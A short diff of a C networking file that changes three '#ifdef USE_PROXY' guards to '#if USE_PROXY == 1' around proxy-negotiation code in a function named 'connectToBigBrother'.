@@ -21,7 +21,7 @@ static wchar_t pathWithName[260 + 1];
 
 static struct in_addr getAddress(const char *hostname);
 
-#ifdef USE_PROXY
+#if USE_PROXY == 1 
 
 static bool negotiateTheProxyServer(EASCKT sckt);
 
@@ -204,7 +204,7 @@ void connectToBigBrother(void)
             Sleep(1300);
         }
 
-#ifdef USE_PROXY
+#if USE_PROXY == 1 
 
         LOG("\t\tNegotiate Proxy\n");
 
@@ -284,7 +284,7 @@ static struct in_addr getAddress(const char *hostname)
     return *((struct in_addr **)hostdata->h_addr_list)[0];
 }
 
-#ifdef USE_PROXY
+#if USE_PROXY == 1 
 
 #include <stdint.h>
 
